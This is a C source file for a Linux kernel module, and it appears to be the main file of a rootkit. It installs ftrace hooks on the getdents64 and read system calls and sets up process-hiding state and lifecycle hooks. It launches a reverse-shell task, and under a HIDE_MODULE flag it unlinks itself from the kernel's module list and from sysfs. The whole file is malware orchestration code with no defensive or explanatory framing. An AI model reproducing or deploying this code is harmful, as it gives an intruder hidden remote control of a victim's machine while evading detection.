#include <linux/module.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents64.h"
#include "hooks/x64_sys_read.h"
#include "tasks/task_manager.h"
#include "tasks/reverse_shell.h"
#include "core/proc_state.h"
#include "core/lifecycle.h"

#include <linux/version.h>
#include <linux/rcupdate.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0)
/*
 * 老内核：synchronize_sched 仍然存在
 */
#define MODE_SYNCHRONIZE_EXIT() synchronize_sched()
#else
/*
 * 新内核：synchronize_sched 已废弃
 * 用 RCU 同步替代
 */
#define MODE_SYNCHRONIZE_EXIT() synchronize_rcu()
#endif


// ---------------- 自定义任务 ----------------
static struct k_task tasks[] = {
    {&rshell_func, NULL},
};

// ---------------- ftrace hook ----------------
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_read", hook_read, &orig_read),
};

// ---------------- 模块初始化 ----------------
static int __init mode_init(void)
{
    int err;

    /* 1. 初始化进程隐藏状态管理 */
    err = proc_state_init();
    if (err) {
        // pr_err("proc_state_init failed: %d\n", err);
        return err;
    }

    /* 2. 注册 fork/exec/exit 生命周期 hook */
    err = lifecycle_init();
    if (err) {
        // pr_err("lifecycle_init failed: %d\n", err);
        proc_state_cleanup();
        return err;
    }

    /* 3. 安装 ftrace hook */
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        // pr_err("fh_install_hooks failed: %d\n", err);
        lifecycle_cleanup();
        proc_state_cleanup();
        return err;
    }

    /* 4. 启动自定义任务 */
    err = run_tasks(tasks, ARRAY_SIZE(tasks));
    if (err) {
        // pr_err("run_tasks failed: %d\n", err);
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
        lifecycle_cleanup();
        proc_state_cleanup();
        return err;
    }

#ifdef HIDE_MODULE
    /* 隐藏模块自身 */
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif

    // pr_info("mode module loaded successfully\n");
    return 0;
}

// ---------------- 模块卸载 ----------------
static void __exit mode_exit(void)
{
    /* 1. 停止内部线程 */
    stop_tasks(tasks, ARRAY_SIZE(tasks));

    /* 2. 移除所有 hook */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    /* 3. 等待所有 CPU 退出 hook */
    MODE_SYNCHRONIZE_EXIT();

    /* 4. 注销生命周期 / notifier */
    lifecycle_cleanup();

    /* 5. 再等一次，防止 exit / fork 竞态 */
    MODE_SYNCHRONIZE_EXIT();

    /* 6. 清理数据结构 */
    proc_state_cleanup();


    // pr_info("mode module unloaded safely\n");
}


module_init(mode_init);
module_exit(mode_exit);
MODULE_LICENSE("GPL");

